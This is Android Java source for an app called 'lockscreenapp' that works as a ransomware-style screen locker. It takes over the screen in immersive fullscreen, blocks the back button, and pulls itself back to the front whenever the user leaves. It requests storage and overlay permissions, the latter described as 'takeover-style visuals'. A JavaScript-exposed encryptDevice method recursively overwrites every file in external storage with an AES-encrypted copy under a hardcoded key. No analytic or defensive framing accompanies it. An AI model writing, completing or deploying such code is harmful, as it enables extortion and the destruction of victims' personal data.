package com.example.lockscreenapp;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {
    WebView webView;
    private static final int REQUEST_PERMISSIONS_CODE = 123;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestRequiredPermissions();

        // Fullscreen + stay awake
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
                View.SYSTEM_UI_FLAG_FULLSCREEN |
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
        );

        webView = new WebView(this);
        setContentView(webView);

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowFileAccess(true);

        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient());
        webView.addJavascriptInterface(new JSBridge(this), "Android");
        webView.loadUrl("file:///android_asset/lock.html");
    }

    private void requestRequiredPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Request storage permission
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {

                ActivityCompat.requestPermissions(this, new String[]{
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE
                }, REQUEST_PERMISSIONS_CODE);
            }

            // Request "Draw Over Other Apps" permission (for takeover-style visuals)
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
    }

    @Override
    public void onBackPressed() {}

    @Override
    protected void onPause() {
        super.onPause();
        moveToFront();
    }

    @Override
    protected void onUserLeaveHint() {
        moveToFront();
    }

    private void moveToFront() {
        ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        if (am != null) {
            am.moveTaskToFront(getTaskId(), 0);
        }
    }

    public static class JSBridge {
        Context context;

        public JSBridge(Context ctx) {
            this.context = ctx;
        }

        @JavascriptInterface
        public void unlockDevice() {
            Activity activity = (Activity) context;
            activity.runOnUiThread(() -> {
                WebView webView = new WebView(context);
                webView.loadUrl("file:///android_asset/success.html");
                activity.setContentView(webView);
            });
        }

        @JavascriptInterface
        public void playClickSound() {
            MediaPlayer.create(context, android.provider.Settings.System.DEFAULT_NOTIFICATION_URI).start();
        }

        @JavascriptInterface
        public void hideSystemUI() {
            Activity act = (Activity) context;
            act.runOnUiThread(() -> {
                View decor = act.getWindow().getDecorView();
                decor.setSystemUiVisibility(
                        View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
                        View.SYSTEM_UI_FLAG_FULLSCREEN |
                        View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                        View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                        View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                );
            });
        }

        @JavascriptInterface
        public void encryptDevice() {
            new Thread(() -> {
                File root = Environment.getExternalStorageDirectory();
                encryptAll(root);
            }).start();
        }

        private void encryptAll(File dir) {
            File[] files = dir.listFiles();
            if (files == null) return;
            for (File file : files) {
                if (file.isDirectory()) encryptAll(file);
                else encrypt(file);
            }
        }

        private void encrypt(File file) {
            try {
                SecretKeySpec key = new SecretKeySpec("MySuperSecretKey".getBytes(), "AES");
                Cipher cipher = Cipher.getInstance("AES");
                cipher.init(Cipher.ENCRYPT_MODE, key);

                FileInputStream fis = new FileInputStream(file);
                byte[] bytes = new byte[(int) file.length()];
                fis.read(bytes);
                fis.close();

                byte[] encrypted = cipher.doFinal(bytes);

                FileOutputStream fos = new FileOutputStream(file);
                fos.write(encrypted);
                fos.close();
            } catch (Exception e) {
                Log.e("EncryptErr", file.getName(), e);
            }
        }
    }

    // Handle permission result
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // Optionally handle if user denies permission
    }
}